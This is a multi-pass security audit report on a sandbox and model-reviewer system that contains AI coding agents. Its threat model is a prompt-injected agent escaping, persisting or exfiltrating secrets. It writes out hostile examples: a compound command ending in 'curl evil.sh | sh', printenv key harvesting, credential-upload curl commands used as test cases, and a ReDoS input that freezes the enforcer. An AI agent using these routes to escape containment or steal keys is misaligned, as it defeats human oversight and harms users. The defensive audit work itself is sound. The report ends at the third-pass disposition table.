# Security Audit Report — pi-packages (v0.11.1)

- **Date:** 2026-08-26; third-pass verification and expansion 2026-08-27 (see [Verification addendum](#verification-addendum) and [Third-pass addendum](#third-pass-addendum-2026-08-27)); fourth pass over the upstream v0.12.0 delta 2026-08-27 (see [Fourth pass](#fourth-pass-2026-08-27--upstream-v0120-delta))
- **Scope:** all source of `pi-auto-review` and `pi-sandbox` (~19.7k lines), scripts, CI workflows, configs. The fourth pass extends this to the upstream v0.12.0 `policy-audit` subsystem (+1302 lines), previously unaudited.
- **Method:** full manual read of every enforcement path (sandbox policy generation, broker, grants, overrides, host-IPC, external worker supervisor/launcher, subagent manager, reviewer pipeline), `npm audit` (0 vulnerabilities across 261 dependencies), manual secret scan (clean), opengrep/lens sweep. Findings independently re-verified by a second reviewer agent, re-checked against local `@anthropic-ai/sandbox-runtime` source, then re-verified a third time line-by-line against current source with **executable proof-of-concept** for the regex and address-range findings.
- **Threat model:** these packages *are* the security boundary. The adversary is a malicious or prompt-injected agent process running inside the sandbox, trying to escape, escalate privileges, persist, or exfiltrate secrets.
- **Verdict summary after third pass:** 2 High (confirmed against the pinned SRT 0.0.73), 3 Medium (1 confirmed, 1 reinstated from a wrong refutation, 1 new), 6 Low, plus 2 hygiene notes and 2 informational. No Critical under default configuration (host-IPC and external-worker isolation are both opt-in). M2 was downgraded to L8 on 2026-08-27 after reading the pinned permission system.

---

## High

### H1. External-worker sandbox allows writes to most of `~/.pi/agent` — including installed extension code and `auth.json` [CONFIRMED]

**Files:** `packages/pi-sandbox/src/external-worker-launcher.mjs:170-212`

**Issue:** the outer Sandbox Runtime policy for pi-subagents workers puts `agentDir` in `allowWrite` while `denyWrite` covers only `settings.json`, `permissions.json`, `sandbox.json`, `extensions/`, the pi-sandbox package root, and the node bin dir. Everything else under `~/.pi/agent` is therefore writable.

**Mechanism verified against the pinned Sandbox Runtime 0.0.73** (re-verified 2026-08-27 from the published tarball; the earlier 0.0.26 reading is superseded and every claim below still holds):
- Linux (`dist/sandbox/linux-sandbox-utils.js`): each `allowWrite` path becomes a read-write `--bind` (`:642`); each `denyWrite` path becomes a `--ro-bind` and **the denyWrite args are emitted last**, so they layer on top of any write bind (`:1208` — "Emitting denyWrite last means these ro-binds layer on top of any write"). Deny wins; non-denied siblings of the denied files stay writable.
- macOS (`dist/sandbox/macos-sandbox-utils.js`): `allowWrite` → `(allow file-write* (subpath …))`, `denyWrite` → `(deny file-write* …)`; deny rules win.
- SRT's mandatory-deny scan for "dangerous files" (`.mcp.json`, `.bashrc`, `.gitconfig`, `.git/hooks`, …) is rooted at `process.cwd()` on Linux — `linuxGetMandatoryDenyPaths` opens with `const cwd = process.cwd()` (`:172`), resolves every entry against it (`:180-182`), and passes that same `cwd` as the ripgrep scan root (`:232`). The broker's cwd is the workspace, not `agentDir`, so on Linux nothing under `~/.pi/agent` receives incidental protection; on macOS the `**/` globs reach `agentDir` but the list does not include the high-value targets below.

**Concrete targets (verified on this machine):** `~/.pi/agent/npm/node_modules/**` — twelve installed extensions pi executes in-process at startup (`pi-lens`, `pi-mcp-adapter`, `pi-knowledge`, `pi-web-access`, `pi-cmux`, …); `auth.json` (Pi credentials); `skills/`, `agents/`, `bin/`, `trust.json`; on Linux also `mcp.json`/`mcp-cache.json` (macOS: covered by SRT's `**/.mcp.json` mandatory deny). Correction from initial audit: `@erichll/pi-auto-review` is *not* currently installed in this machine's npm tree — but the README-recommended install puts it exactly there, and the twelve packages that are present are equally sufficient for persistence.

**Impact:** a compromised external worker (requires `subagents.provider: "pi-subagents"` + `externalWorkerIsolation: "enforce"`) overwrites installed extension code or `auth.json` — code and credentials that execute/loaded as the user, outside any sandbox, at the next `pi` start. Full host-compromise persistence chain through the configuration recommended as the hardening option.

**Recommended fix:** remove `agentDir` from `allowWrite`; enumerate the narrow paths Pi genuinely needs to create (settings lock files, provider model caches — capture them the way `sessionDir` already is). Add explicit `denyWrite` entries for `npm/`, `git/`, `auth.json`, `mcp.json`, `mcp-cache.json`, `trust.json`, `skills/`, `agents/`, `bin/`, `blobs/` as defense in depth. Add a regression test asserting the deny set covers every entry pi loads code or config from.

### H2. Host environment — API keys and the supervisor capability — flows into every sandboxed process [CONFIRMED]

**Files:** `packages/pi-sandbox/src/runner.ts:193-209`, `subagent.ts:336-341`, `external-worker-launcher.mjs:220-231`; upstream pi `getShellEnv()` returns `{...process.env}`.

**Issue:** `brokerEnv = options.env ?? process.env` is forked into `srt-broker.mjs`, which spawns the target with `wrapped.env`.

**Chain verified end-to-end against SRT 0.0.73 (mechanism text corrected 2026-08-27).** No `--clearenv` exists anywhere in the package, and bubblewrap inherits the parent environment by default, so every host variable reaches the sandboxed process: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, and — when external isolation is enabled — `PI_SANDBOX_EXTERNAL_SUPERVISOR_SOCKET` + `PI_SANDBOX_EXTERNAL_SUPERVISOR_CAPABILITY`.

**Correction to the earlier passes:** they asserted "SRT never calls `--clearenv`/`--unsetenv`". That was true of 0.0.26 but is **false for the pinned 0.0.73**, which ships a purpose-built credential-env facility. `credentials.envVars[]` accepts `mode: "deny"` → `bwrap --unsetenv NAME` on Linux (`linux-sandbox-utils.js:1404-1407`) and `env -u NAME` on macOS (`macos-sandbox-utils.js:842`), or `mode: "mask"` → the sandbox sees a registered sentinel value while the host proxy substitutes the real credential on egress to `injectHosts`. `credentials.files[]` does the same for credential files. The finding is unaffected — arguably strengthened — because **pi-sandbox never populates it**: `toSandboxRuntimeConfig` (`pi-sandbox/src/policy.ts:298-320`) emits only `filesystem` and `network`, and with `credentials` undefined `getCredentialRestrictions` (`sandbox-manager.js:825-833`) returns empty `unsetEnvVars`/`setEnvVars`. The gap is now "a shipped upstream control is left switched off", not "no mechanism exists".

**Impact:** a prompt-injected agent runs `printenv` inside the sandbox and harvests model credentials; the credential-exfiltration hard-deny regexes match credential *files* (`.env`, `~/.aws/credentials`), not `printenv`/`env` dumps. The supervisor capability is unreachable today only because `allowAllUnixSockets: false` and seccomp blocks socket creation — one config change or seccomp-unavailable platform (SRT logs a warning and continues without seccomp) away from worker impersonation.

**Recommended fix (revised after reading 0.0.73 — prefer the upstream mechanism).** Populate SRT's `credentials` block from `toSandboxRuntimeConfig` instead of hand-rolling an env filter in three places:

- `mode: "mask"` for provider API keys. This is strictly better than an allowlist for this case: the sandboxed agent reads only a sentinel, yet legitimate outbound calls to `injectHosts` still work because the host proxy swaps the real value back in on egress. An allowlist forces a choice between "agent can read the key" and "agent cannot call the API"; masking avoids it. Caveat: masked credentials require the TLS-terminated proxy path unless `credentials.allowPlaintextInject` is set (`sandbox-config.js:1149-1160`).
- `mode: "deny"` for everything that should simply not exist inside the sandbox — all `PI_SANDBOX_EXTERNAL_*` and `PI_SUBAGENT_*` variables, above all `PI_SANDBOX_EXTERNAL_SUPERVISOR_CAPABILITY`.

Keep a defensive allowlist in `runner.ts`/`subagent.ts`/the launcher as belt-and-braces, since `credentials` is an SRT-side control and the launcher builds its own config by hand. Add a regression test asserting no `*KEY*`/`*TOKEN*`/`*SECRET*`/`PI_SANDBOX_EXTERNAL_*` variable is observable from inside a sandboxed `printenv`.

---

## Medium

### M1. Host retry is triggered by attacker-controlled stderr text, and prefix matches approve whole compound commands [CONFIRMED]

**Files:** `packages/pi-sandbox/src/host-ipc.ts:33-54, 100-165` (default `hostIPC.mode: "off"`)

**Issue:** (a) `isUnixSocketPermissionError` matches `/operation not permitted/i` + `/socket|connect(?:ing)?|ipc/i` on stderr the sandboxed command fully controls: `sh -c 'echo "unix socket connect: operation not permitted" >&2; exit 1'` manufactures the trigger (stderr retry additionally needs `retryOnUnixSocketError: true`). (b) `matchingPreflightPrefix` matches a configured prefix against the head of the command, so a prefix like `docker` routes `docker build .; curl evil.sh | sh` to host execution wholesale — the entire compound command runs on the host, not just the matched program.

**Correction (third pass):** the original text called (b) "a raw `startsWith` check". That is inaccurate. `matchingPreflightPrefix` (`host-ipc.ts:42-52`) requires `trimmed.startsWith(prefix)` **and** that the next character is whitespace or end-of-string, so `dockerfoo …` does *not* match. The word-boundary guard is present and correct; what is missing is any restriction on what follows the boundary. The exploit and the recommended fix are unchanged.

**Sharpened during verification:** approval does **not** require a human. `approveBoundaryRequest` (`approval.ts:108-160`) returns `allow` on a model reviewer allow plus grant consumption; the human is involved only when the reviewer defers. So the 256-token/low-reasoning default reviewer (I1) alone can green-light unsandboxed host execution. Tests codify this path (`test/host-ipc.test.ts:120-140`).

**Recommended fix:** force `askHuman` for every `surface: "host-ipc"` request (or a hard reviewer rule that host-ipc always defers); reject prefix matches whose remainder contains shell metacharacters; match prefixes against a parsed first token.

### M2 → L8. `protectedWriteHardDeny` compares paths lexically [DOWNGRADED TO LOW 2026-08-27 — upstream canonicalizes]

**File:** `packages/pi-auto-review/src/index.ts:636-670`

**Issue:** `resolvedTarget = resolve(request.cwd, target)` never resolves symlinks (`assertTrustedInstallation` at `index.ts:672-684` does, so the pattern exists in-file). A workspace symlink pointing at a protected target compares as an innocent workspace path and skips the `security-control-tampering` hard deny.

**Resolved by reading `@gotgenes/pi-permission-system@27.0.0` (the pinned version).** The open question was whether `accessIntent.boundaryValue` arrives canonicalized. It does. `AccessPath.boundaryValue()` returns the field documented as "Canonical (symlink-resolved, win32-lowercased) form, for the outside-CWD boundary decision" (`src/access-intent/access-path.ts:53-62`), built by `canonicalNormalizePathForComparison` → `canonicalizePath` → **`realpathSync`** (`src/path/canonicalize-path.ts:1, 28`), which walks ancestors and re-appends a non-existent tail. Upstream even separates the two representations deliberately: `matchValues()` carries lexical ∪ canonical for pattern matching, `boundaryValue()` carries canonical only for containment — a distinction introduced by their issue #418, where matching config patterns against the canonical form defeated a configured `/tmp/*` allow. So the dominant producer of `resolvedPath` already does exactly what this finding asks pi-auto-review to do, and the symlink bypass does not apply whenever `boundaryValue` is present. **Downgraded from Medium to Low.**

**Residual (why it is not closed outright).** Three narrow paths still reach the lexical comparison, because `normalizePermissionEvidence` sets `resolvedPath: accessIntent?.boundaryValue` and `protectedWriteHardDeny` falls back to `request.resolvedPath || request.path`:

1. `accessFactsFromValue` — every non-path gate (bash command, MCP target, skill, plain tool) hardcodes `boundaryValue: null` (`src/handlers/gates/helpers.ts:36`).
2. `AccessPath.forLiteral` — a relative bash token after a non-literal `cd` yields `boundaryValue() === ""`, normalized to `null` at `helpers.ts:24`.
3. `canonicalizePath` deliberately returns its input unchanged on a non-ENOENT/ENOTDIR error (`EACCES`, `ELOOP`), so a non-canonical value can legitimately flow into `boundaryValue`.

**Recommended fix (unchanged, still worth doing):** `realpathSync` the target (fall back to the lexical path on ENOENT) and compare against realpath'd protected roots/files. It costs one line, closes all three residual paths, and matches what upstream already does for containment checks.


**Additional mechanism found in the third pass — `request.cwd` is attacker-influenced on the sandbox surface.** `sandboxTrapToBoundaryRequest` (`integrations/sandbox.ts:70`, `:88`) sets `cwd: trap.process?.cwd || context.cwd`, i.e. the *traced process's* working directory. `protectedWriteHardDeny` then derives three of its seven protected files from that value (`join(request.cwd, ".pi", "settings.json")`, `sandbox.json`, `PROJECT_CONFIG_PATH`). A sandboxed process that `chdir`s elsewhere before writing therefore shifts the workspace half of the protected set off the real workspace. The `homedir()`-derived entries are unaffected, and the OS sandbox independently denies these writes, so this is not exploitable on the sandbox surface today — but the authorizer should not compute a protected set from a value the subject controls. Fix alongside the realpath change: derive workspace-protected paths from the trusted extension `ctx.cwd`, not from `request.cwd`.

### M4. Catastrophic regex backtracking in `deterministicHardDeny` hangs the host event loop [NEW — reverses the earlier "L5 REFUTED" verdict]

**File:** `packages/pi-auto-review/src/policy.ts:437-441` (the `envPath` fragment), reached from `index.ts:2007-2015`.

**Issue:** the earlier verification refuted L5 on the grounds that "the dynamic `RegExp` inputs are regex-escaped and the static fragments are linear". The escaping claim is correct; the linearity claim is not. `envPath` is built as

```
(?:[^\s"'@<>=|;&()]+\/)*  +  \.env(?:\.(?!example\b|sample\b)[A-Za-z0-9_-]*)*(?=…)
```

The segment character class `[^\s"'@<>=|;&()]` **does not exclude `/`**, so each `+` can itself consume slashes and the surrounding `*` can re-split the same text exponentially many ways. When the trailing `\.env…` fails to match, the engine explores all of them. The sibling fragment `credentialDirectoryPath` (`policy.ts:443-447`) uses `[^\s"'@<>=|;&()\/]+` and is correctly unambiguous — the omission in `envPath` looks like a copy-paste slip.

**Measured on this machine (Node 22, `node /tmp/redos2.mjs`):**

| input | `stagedCredentialRead` | `directCredentialUpload` |
|---|---|---|
| `cat ` + `a/`×20 + `!` (45 ch) | 60 ms | 37 ms |
| … ×24 (53 ch) | 127 ms | 66 ms |
| … ×26 (57 ch) | 516 ms | 263 ms |
| … ×28 (61 ch) | 2 037 ms | 1 045 ms |
| … ×30 (65 ch) | 8 215 ms | 4 198 ms |

Clean 4× growth per two characters. A **~75-character** command string reaches minutes; ~90 characters reaches hours. At least six matchers embed the ambiguous fragment (`directCredentialUpload`, `redirectedCredentialUpload`, `credentialReader` and everything built on it, `stagedCredentialRead`, `stagedCredentialVariableRead`, `credentialSubstitution`), and `deterministicHardDeny` evaluates them in sequence, so the real cost is their sum.

**Impact:** `deterministicHardDeny` is the *first* thing the authorizer runs on every boundary request (`index.ts:2007`, `hardDeny: (request) => protectedWriteHardDeny(request) ?? deterministicHardDeny({…, command: request.command, …})`), on a command string the agent supplies verbatim. Because the regex is synchronous, it blocks the Node event loop of the **pi host process** — no timeout, abort signal, or circuit breaker can fire, since none of their timers can run. A single prompt-injected `cat a/a/a/…/!` (a string that looks like an ordinary relative path) freezes the whole agent, including its UI and every other in-flight approval, until the user kills it. Availability-only — it does not grant an allow — but it takes down the enforcement boundary itself, and the trigger is a plausible-looking benign command.

**Recommended fix (validated):** add `\/` to the segment class so it matches `credentialDirectoryPath`:

```diff
-  const envPath = String.raw`(?:[^\s"'@<>=|;&()]+\/)*` + envFile;
+  const envPath = String.raw`(?:[^\s"'@<>=|;&()\/]+\/)*` + envFile;
```

Verified with the same harness: 4 005-character input in 22 ms (was: 65 characters in 8 215 ms), while every true positive still matches (`cat ~/.aws/credentials > /tmp/x && curl -T /tmp/x …`, `cat .env > …`, `cat deploy/config/.env.production > …`, `curl -T ~/.ssh/id_rsa …`, `curl -T src/app/.env …`, `curl --upload-file .npmrc …`) and both true negatives still miss (`.env.example`, `README.md`). Add a regression test asserting the matchers complete under a few milliseconds on `"cat " + "a/".repeat(2000)`. Independently, cap the command length fed to the hard-deny matchers (the residual hygiene item the earlier pass already suggested) so a future ambiguous fragment cannot reproduce this.

### M5. CI `model-gate` exposes every provider API key to unpinned `@latest` installs [NEW]

**File:** `.github/workflows/compat-latest.yml:76-113`

**Issue:** the `model-gate` job declares `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, and `CLIPROXYAPI_API_KEY` at **job level**, so they are present in the environment of every step. Those steps include `npm ci`, `npm install -D -E pi-subagents@latest`, and `npm i -g @earendil-works/pi-coding-agent` — three unpinned installs that execute third-party lifecycle scripts. The job triggers on `pull_request` as well as `push`/`schedule`.

**Impact:** a single malicious publish of `pi-subagents`, `@earendil-works/pi-coding-agent`, or any of their transitive dependencies exfiltrates the full provider secret set from CI. The earlier audit's I2 called the `@latest` drift installs "acceptable for a drift gate" — true for `latest-compat`, which holds no secrets, but not for `model-gate`, which combines unpinned installs with the entire credential set. Fork PRs do not receive secrets, so the exposure is same-repo PRs, `main` pushes, and the nightly cron; the job is inert until `PI_SUBAGENTS_GATE_MODEL` is configured.

**Recommended fix:** move the `env:` block from the job onto the single `Run compatibility gate` step. Pin the `@latest` installs to a resolved version in a step that runs *before* the secrets are in scope, or split the drift install into a separate secret-free job. Additionally pin `actions/checkout` and `actions/setup-node` to full commit SHAs rather than the floating `@v4` major tag, and add `--ignore-scripts` to the drift installs where the suite allows it.

---

## Low

### L1. Supervisor trusts client-claimed `cwd`, and its state grows unbounded [CONFIRMED]
`packages/pi-sandbox/src/external-supervisor.ts:93-111, 187-198` — `register` validates only absolute syntax/length; `seen`/`workers` never prune (host memory growth in long sessions). Requires holding the capability, which requires escaping first (defense-in-depth). Fix: bind workerId→cwd from the trusted launcher side; add LRU/TTL pruning.

### L2. Workspace placeholders are written before registration is approved [CONFIRMED]
`packages/pi-sandbox/src/external-worker-launcher.mjs:68-151` — placeholders (`.gitconfig`, `.bashrc`, `.mcp.json`, `.vscode/`, `.claude/…`, `.pi/`) land before the supervisor's `allow` at line 181; exit-handler cleanup is bypassed by SIGKILL. nuisance-level integrity issue, not an escape. Fix: register first, create only on `allow`.

### L3. Network policy rebinding window + IPv6 transition-range gaps [PARTIALLY CONFIRMED — amended]
`packages/pi-sandbox/src/network-policy.mjs:21-28, 55-70` — approval-time `lookup()` vs the host-side proxy's connect-time resolution leaves a DNS-rebinding window (a hostname approved as public can resolve to link-local/metadata at connect). Correction accepted: `parseHostPort("::1")` yields host `":"`, port `1` (not host `"::"`) — still mis-parsed; confirmed evidence-only, since `destinationHost`/`destinationPort` feed only grant hashing, the reviewer transcript, and audit records, never an enforcement comparison (`grants.ts:25-26`, `policy.ts:1104-1105`). Make it bracket-aware anyway.

**Missing ranges re-tested executably (third pass).** Confirmed absent from `prohibitedAddresses` and treated as public: `64:ff9b::/96` (NAT64), `2002::/16` (6to4), `2001::/32` (Teredo), `100::/64` (discard-only). NAT64 is the sharpest of these — `64:ff9b::169.254.169.254` and `64:ff9b::7f00:1` both evaluate as public, embedding the cloud metadata endpoint and loopback respectively. **Non-finding recorded so it is not re-investigated:** IPv4-mapped addresses are *not* a gap — Node's `BlockList` resolves `::ffff:127.0.0.1`, `::ffff:169.254.169.254`, and `::ffff:10.0.0.1` against the registered IPv4 subnets, and all three are correctly blocked. `2001:db8::/32` stays dropped (documentation space).

### L6. External-worker policy drops the workspace secret write-denials entirely [NEW]
`packages/pi-sandbox/src/external-worker-launcher.mjs:171-183` vs `packages/pi-sandbox/src/policy.ts:281-296` — `createDefaultPolicy` appends `createWorkspaceSecretDenyWritePaths(workspace)` (root `.env*` basenames, `secrets/`, discovered `*.pem`/`*.key`/`*.p12`/`*.pfx`, plus the Darwin `**/` globs) to `denyWrite`. The external worker launcher builds its `runtimeConfig` by hand and includes **none** of them, so the M3 control is not merely thin on that path — it is absent. The launcher's agent-dir deny set is likewise a strict subset of the default policy's: it omits `~/.pi/agent/logs` (audit-record integrity) and the legacy `pi-sandbox.json`. Fix: have the launcher call the shared `createDefaultPolicy`/`createWorkspaceSecretDenyWritePaths` helpers instead of duplicating a hand-rolled config, and add a test asserting the external policy's `denyWrite` is a superset of the default policy's.

### L7. The external-worker launcher trusts unvalidated `PI_SANDBOX_EXTERNAL_*` input [NEW]
`packages/pi-sandbox/src/external-worker-launcher.mjs:13, 158-160, 243` — `PI_SANDBOX_EXTERNAL_REAL_PI_BINARY` is executed as `invocation[0]` despite the file comment calling it "a verified Pi binary" (no verification is performed), and `PI_SANDBOX_EXTERNAL_ALLOW_READ` is `split(":")` straight into `allowRead` with no absolute-path or containment check. The values are injected by trusted host code (`index.ts:123-131`), so this is not currently reachable — but H2 means these same variables are visible inside every sandbox, and the launcher is the component that *builds* the boundary, so it should not treat its environment as trusted. Fix: assert `realPi === process.execPath`, and require each `extraRead` entry to be absolute and within the workspace or agent dir.

### L8. `protectedWriteHardDeny` compares paths lexically [downgraded from M2 on 2026-08-27]
Documented in place under [M2 → L8](#m2--l8-protectedwritehardeny-compares-paths-lexically-downgraded-to-low-2026-08-27--upstream-canonicalizes) in the Medium section, where its history is easier to follow. Summary: `@gotgenes/pi-permission-system@27.0.0` canonicalizes `boundaryValue` via `realpathSync`, so the symlink bypass does not apply on the surface that mattered; three narrow residual paths remain and the one-line fix still applies.

### L9. No test on any platform exercises real Sandbox Runtime enforcement on macOS [NEW 2026-08-27]
`packages/pi-sandbox/test/srt-capable.ts` opens with `if (process.platform !== "linux") return false;`, so the two tests that drive a real broker (`runner.test.ts`'s `rpcTest`, `external-supervisor.test.ts`'s `sandboxTest`) are skipped on every non-Linux host. Everything else in `runner.test.ts` passes `broker: fakeBroker` or `probeBroker`, and `macos.test.ts` — despite its name — also uses the fixture broker, so it verifies the broker *message contract*, not enforcement. Net effect: on a 102-test suite, real Seatbelt enforcement is exercised zero times, and the Linux path only in CI. Every macOS claim in this audit (deny-rule precedence, H1's `agentDir` writability, the `**/` secret globs) therefore rests on reading profile-generation code, never on observing a live sandbox. This is a coverage finding rather than a vulnerability, but it is the reason H1 cannot currently be fixed safely: the missing input is empirical. Fix: add a Darwin-gated integration test that runs a real `sandbox-exec` broker and asserts a write outside `allowWrite` fails and a write inside succeeds.



---

## Hygiene / notes (downgraded from Low after verification)

**Former L4 — git hooks: RESOLVED, no action. Re-confirmed on the pinned 0.0.73 (2026-08-27).** `.git/hooks` is a mandatory deny on both platforms — `linux-sandbox-utils.js:198-199` ("Git hooks always blocked for security") plus the nested-repo glob `**/.git/hooks/**` at `:214`, and `macos-sandbox-utils.js:25-27` — and it is independent of `allowGitConfig`, which gates only `.git/config` (`:201-202`, `:216-217`). SRT also defends symlink-replacement attacks against deny paths. Version caveat removed. One nuance worth recording: in 0.0.73 the top-level `.git/hooks` deny is emitted only when `.git` is a **directory** (`:189-199`), because in a worktree `.git` is a file and binding there would abort bwrap, while in a fresh directory it would block `git init`. Worktrees are still covered by the `**/.git/hooks/**` glob, and the launcher's `worktreeGitReadPaths` grants only *read* access to the resolved gitdir, so no gap results.

**~~Former L5 — ReDoS: REFUTED as a vulnerability.~~ REFUTATION WITHDRAWN — see [M4](#m4-catastrophic-regex-backtracking-in-deterministichardeny-hangs-the-host-event-loop-new).** The second pass concluded "the dynamic `RegExp` inputs are regex-escaped and the static fragments are linear — no catastrophic-backtracking path was demonstrated". The first half is right and still holds; the second half is wrong. A catastrophic path exists in the *static* `envPath` fragment and is demonstrated with timings in M4. The lesson for future passes: "no path was demonstrated" is not evidence of linearity, and hand-inspection of a 200-character composed regex is not a substitute for running it.

**M3 (former Medium) — workspace secret write-denial coverage: downgraded to Low.** Depth-4 walk, skipped directories, basename/extension list gaps (no `id_rsa`, `.netrc`, `.npmrc`, `credentials.json`) are real (`policy.ts:62-143`), but workspace writes are allowed by design — this control is secret-integrity defense-in-depth, not an escape path. Fix when convenient: match `deterministicHardDeny`'s credential list; consider `git ls-files`.

---

## Informational

**I1. Reviewer capacity vs. authority mismatch [CONFIRMED].** Defaults (`packages/pi-auto-review/src/index.ts:285-299`): `codex-auto-review`, `reasoning: "low"`, `maxTokens: 256` — and per M1, that single completion can authorize unsandboxed host execution. The prompt-injection containment (markup escaping, "untrusted data" framing, compaction notices, `allow+critical` rejection) is genuinely good. Recommend: higher reasoning/token budget for `host-ipc`/network surfaces; consider dropping `external_directory` from `autoConfirmBoundedAllows`.

**I2. Supply chain [CONFIRMED with amendment].** `npm audit` clean at audit time (not re-runnable in this checkout — no node_modules). Dev pins exact (`sandbox-runtime 0.0.73`, `pi-subagents 0.56.0`); note the *published peer* range is `pi-subagents >=0.50.0`, so consumer installs are not pinned. CI `contents: read`; drift-gate jobs intentionally install `@latest` (acceptable for a drift gate).

---

## What is done right (keep it that way)

Fail-closed behavior is consistent everywhere (broker failure → deny; malformed external policy → deny-all; unsupported platform → refuse). Break-glass requires TUI + idle + typed 60-second challenge. Circuit breaker suppresses per-turn denial nagging. Shell quoting in both spawn paths is correct (`srt-broker.mjs:59-61` single-quotes with `'\''` escaping, and `commandInvocation` passes the command as one argv element). Per-command private temp dirs. SRT contributes mandatory hook/dangerous-file denies and symlink-replacement defenses under the workspace. `approveSandboxTrap` hard-denies *all* network traps and every `deny_match` filesystem trap before the reviewer is consulted.

Two claims from earlier passes are worth stating more precisely, both in the codebase's favour:

- **Grant binding is complete, not merely "request-hash-bound".** `boundaryRequestHash` (`grants.ts:9-33`) covers every field of `BoundaryRequest` except `id`, which is the per-request nonce and must be excluded. There is no security-relevant field a grant could be replayed across. `consume` additionally re-checks session, TTL, and `usesRemaining === 1`, then deletes the token.
- **"Project config can only tighten" applies to pi-auto-review; pi-sandbox has no project-config surface at all.** `applyProjectConfig` (`pi-auto-review/src/index.ts:558-620`) enforces tightening-only for the four permitted keys and rejects any other key outright. `pi-sandbox/src/config.ts` never reads from `cwd` — it loads only `~/.pi/agent/extensions/pi-sandbox/config.json` and the legacy home path — so a workspace cannot influence sandbox policy even by tightening. The stronger statement is the accurate one.

## Prioritized remediation

**Fixed on 2026-08-27** (test-first, full suite green — see [Remediation log](#remediation-log-2026-08-27)): **M4**, **M5**, **L6**, **L7** (partial), **L8**.

Outstanding, in order:

1. **H1** — remove `agentDir` from `allowWrite` in the external worker policy and enumerate the narrow paths Pi genuinely creates, plus explicit denies for `npm/`, `auth.json`, `mcp.json`, `skills/`, `agents/`, `bin/`, `trust.json`. **Blocked on evidence**, not on effort: nobody has established which paths Pi legitimately writes under `~/.pi/agent` at worker startup, and guessing breaks external workers. The L6 work already moved the policy into a testable `createExternalWorkerPolicy`, so the change itself is now a one-function edit with a test seam waiting.
2. **H2** — populate SRT 0.0.73's `credentials` block (`mask` for provider keys, `deny` for `PI_SANDBOX_EXTERNAL_*`/`PI_SUBAGENT_*`), with a defensive env allowlist in `runner.ts`/`subagent.ts`/launcher behind it.
3. **M1** — force human approval for host-ipc; reject metacharacter tails on prefix matches.
4. **L7 residue** — the launcher now rejects relative/missing/non-file values for `PI_SANDBOX_EXTERNAL_REAL_PI_BINARY`, but cannot prove the binary is Pi's runtime. See the log for why strict equality was rejected.
5. **L1-L3, M3-residue, I1** — scheduled hardening.
6. **Test coverage of the enforcement boundary** — see the new coverage finding below; no test on any platform exercises real Sandbox Runtime enforcement on macOS.

---

## Verification addendum (2026-08-26)

> **Superseded in part.** This section is kept as a record of what was known on 2026-08-26. Its SRT conclusions rest on v0.0.26 and its M2 and Former-L5 verdicts were both revised on 2026-08-27 — see the [Third-pass addendum](#third-pass-addendum-2026-08-27). The "re-confirm on upgrade" caveats below are now discharged: the pinned 0.0.73 and permission-system 27.0.0 were read directly.

**Process:** the initial audit was saved, then independently verified by a separate reviewer agent (fresh context, `openai-codex/gpt-5.6-sol`, medium thinking) restricted to repo evidence, then every disputed point was re-verified against local `@anthropic-ai/sandbox-runtime` source (v0.0.26 at `~/Developer/ai/pi-provider-kimi-code/.pi-fork/checkout/node_modules`; the repo pins 0.0.73 — findings marked with version caveat should be re-confirmed on upgrade) and against the live `~/.pi/agent` tree.

| ID | Initial | Verifier | Final (after source re-verification) |
|---|---|---|---|
| H1 | High | Partial (no SRT source) | **High, CONFIRMED** — rw-bind/ro-bind precedence proven; target list corrected (`@erichll` not installed here; twelve other extensions are) |
| H2 | High | Partial (no SRT source) | **High, CONFIRMED** — no `clearenv` anywhere; bwrap inherits env; macOS profile doesn't touch env |
| M1 | Medium | Confirmed | **Medium, CONFIRMED** — sharpened: model reviewer alone approves host exec; human only on defer |
| M2 | Medium | Low (symlink canonicalization unproven) | **Medium (conditional)** — mechanism confirmed; sole-enforcement argument on permission-system surfaces keeps it above Low; fix is cheap regardless |
| M3 | Medium | Low | **Low** — accepted downgrade (workspace writes by design) |
| L1 | Low | Confirmed | **Low, CONFIRMED** |
| L2 | Low | Confirmed | **Low, CONFIRMED** |
| L3 | Low | Partial | **Low, PARTIAL** — `::1` parse correction accepted; `2001:db8` dropped; NAT64/6to4 retained |
| L4 | Low | Cannot-verify | **RESOLVED (no finding)** — SRT mandatory-denies `.git/hooks` on both platforms |
| L5 | Low | Refuted | **REFUTED as ReDoS** — inputs escaped, patterns linear; kept as bounded-input hygiene note |
| I1 | Info | Confirmed | **Info, CONFIRMED** |
| I2 | Info | Partial | **Info, CONFIRMED** — peer-range nuance added |

**Novel findings:** the independent verifier reported none meeting the evidence bar. Source re-verification surfaced refinements folded into H1 (Linux mandatory-deny scan is cwd-only; macOS `**/` globs reach `agentDir`; SRT seccomp can be silently unavailable on unsupported architectures, which slightly raises H2's capability-leak severity) but no new standalone vulnerability.

---

## Third-pass addendum (2026-08-27)

**Process:** every finding above was re-checked line-by-line against current repo source (no reliance on the earlier passes' quotations), and the two findings that admit executable proof — the regex linearity claim and the IPv6 range list — were tested by running them rather than by reading them. Surfaces the earlier passes summarized but did not open were then read in full: `deterministicHardDeny` and its composed matchers, `boundaryRequestHash`/`OneShotGrantStore`, `RecentDenialStore`, `srt-broker.mjs`, `createDefaultPolicy`/`createWorkspaceSecretDenyWritePaths`, `approval.ts`, `pi-sandbox/src/config.ts`, and the CI workflow.

### Disposition of the existing findings

| ID | Prior verdict | Third-pass verdict |
|---|---|---|
| H1 | High, CONFIRMED | **Unchanged.** `allowWrite` contains `agentDir` (launcher `:170-180`); `denyWrite` is exactly `workspaceSecurityFiles` + `agentSecurityPaths` + `packageRoot` + node bin. Sharpened: the *default* policy (`policy.ts:255-300`) correctly never puts `agentDir` in `allowWrite`, and the builtin subagent path uses that default — so this is a regression unique to the external launcher, not a systemic design choice. See also new L6. |
| H2 | High, CONFIRMED | **Confirmed; mechanism text corrected.** `runner.ts:210` `brokerEnv = options.env ?? process.env`; `subagent.ts:349-351` and launcher `:222-231` spread `process.env`. On the SRT side the earlier "never calls `--unsetenv`" claim is false for the pinned 0.0.73, which has an unused `credentials` facility — the finding stands and the fix improves. |
| M1 | Medium, CONFIRMED | **Confirmed, one wording correction.** (b) is not a "raw `startsWith`" — a whitespace/end boundary is enforced. The compound-command exploit is unaffected. The "model reviewer alone approves" sharpening is re-confirmed at `approval.ts:151-176`. |
